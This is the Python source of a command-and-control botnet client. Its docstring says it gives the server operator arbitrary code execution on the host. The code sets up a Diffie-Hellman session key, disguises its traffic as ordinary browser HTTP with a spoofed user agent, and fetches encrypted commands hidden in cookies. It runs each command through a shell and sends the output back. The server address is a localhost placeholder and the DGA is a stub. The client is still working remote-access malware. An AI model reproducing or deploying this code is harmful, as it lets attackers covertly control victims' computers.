import uuid
import json
import os
import subprocess
import random
import base64
import socket
import pyaes
import hashlib
import mechanicalsoup
from requests.utils import quote
from diffiehellman.diffiehellman import DiffieHellman


class Main:
    '''
    This file is the entry point for the C&C client.
    This client should run on any computer with a python3.5 interpreter. Once the client can connect to its server
    the server operator will have the ability to execute arbitrary code on the client.

    This client will attempt to find its server via a simple DGA algorithm.
    '''
    client_id = None
    dh_dest_port = 8081
    svc_dest_port = 8080
    session_key = None

    def __init__(self):
        self.client_id = uuid.uuid4().hex

    def _get_dga_url_base(self):
        return "http://127.0.0.1" + ":" + str(self.svc_dest_port) + "/"

    def _get_dh_node_dga_url_base(self):
        return "127.0.0.1"

    def _execute_command(self, command2run):
        command2runObj = json.loads(command2run)
        command = ""
        args = ""

        command = command2runObj["command"]
        if "args" in command2runObj:
            args = command2runObj["args"]
        return subprocess.check_output(command + " " + args, shell=True).decode()

    def get_command2run(self):
        client_id2send = self.client_id
        random2send = str(uuid.uuid4()).replace("-", "")

        if self.session_key:
            try:
                #Encryption
                encryptor = pyaes.AESModeOfOperationCTR(self.session_key.encode("utf-8"))
                random2send = base64.b64encode(encryptor.encrypt(random2send)).decode()
            except:
                pass

        browser = mechanicalsoup.Browser()
        uri = self._get_dga_url_base() + random2send.replace("/", "") + "/" + self.client_id + "/"
        res = browser.get(uri)

        #Connect to the real HTTP server to get the command
        command2run_raw = res.cookies[self.client_id]
        command2run = command2run_raw
        try:
            #Decryption
            decryptor = pyaes.AESModeOfOperationCTR(key=self.session_key.encode("utf-8"))
            command2run = decryptor.decrypt(base64.b64decode(command2run_raw)).decode("utf-8")
        except Exception as ex:
            command2run = base64.b64decode(command2run_raw).decode("utf-8")

        return command2run

    def report_command_status(self, command, result):
        client_id2send = self.client_id
        random2send = str(uuid.uuid4()).replace("-", "")
        command_hash2send = hashlib.sha256(command.encode()).hexdigest()
        result = base64.b64encode(result.encode("utf-8")).decode("utf-8")

        if self.session_key:
            try:
                #Encryption
                encryptor = pyaes.AESModeOfOperationCTR(self.session_key.encode("utf-8"))

                random2send = base64.b64encode(encryptor.encrypt(random2send)).decode()
                command_hash2send = base64.b64encode(encryptor.encrypt(command_hash2send)).decode()
            except:
                random2send = base64.b64encode(random2send.encode("utf-8")).decode()
                command_hash2send = base64.b64encode(command_hash2send.encode("utf-8")).decode()

        browser = mechanicalsoup.Browser()
        query_arg_id = random.Random().randint(1,1000000000)
        uri = self._get_dga_url_base() + random2send.replace("/", "") + "/" + quote(self.client_id, safe="") + "/" + str(query_arg_id) + "/?" + str(query_arg_id) + "=" + quote(command_hash2send, safe="")

        browser.get_cookiejar().set(name=client_id2send, value=result)
        res = browser.post(uri)
        return res

    def get_dh_session_key(self):
        dh = DiffieHellman(key_length=32)
        dh.generate_public_key()
        client_dh_pubkey = dh.public_key

        c2server_host = self._get_dh_node_dga_url_base()
        c2server_port = self.svc_dest_port
        random_part = uuid.uuid4().hex.replace("-", "")
        user_agent = "Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/7B405"
        client_dh_pubkey_string = base64.b64encode(str(client_dh_pubkey).encode()).decode()
        uri = "/" + random_part + "/" + self.client_id + "/"

        # Build a "Stateful HTTP" request
        http_req = "\n".join([
            "GET " + uri + " " + "HTTP/1.1",
            "Host" + ": " + c2server_host + ":" + str(c2server_port),
            "User-Agent" + ": " + user_agent,
            "Accept: */*",
            "Cookie" + ": " + str(self.client_id) + ":" + client_dh_pubkey_string
        ])

        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((c2server_host, self.dh_dest_port))
        client.sendall(http_req.encode())
        response = client.recv(4096).decode()

        # Parsing this "Stateful HTTP" response
        resp_lines = response.split("\n")
        status = int(resp_lines[0].split(" ")[1])
        date = resp_lines[1].split(": ")[1]
        content_length = resp_lines[2].split(": ")[1]
        server = resp_lines[3].split(": ")[1]
        content_type = resp_lines[4].split(": ")[1]
        server_dh_pubkey = int(base64.b64decode(resp_lines[5].split(": ", maxsplit=2)[1].split("=", maxsplit=2)[1]))
        dh.generate_shared_secret(other_public_key=server_dh_pubkey, echo_return_key=True)
        session_key = dh.shared_secret

        self.session_key = str(session_key)[0:32]

    def run(self):
        #
        try:
            self.get_dh_session_key()
        except Exception as ex:
            self.session_key = None

        host = self._get_dga_url_base()
        command2run = self.get_command2run()

        if command2run:
            command_output = self._execute_command(command2run)
            res = self.report_command_status(command2run, command_output)

Main().run()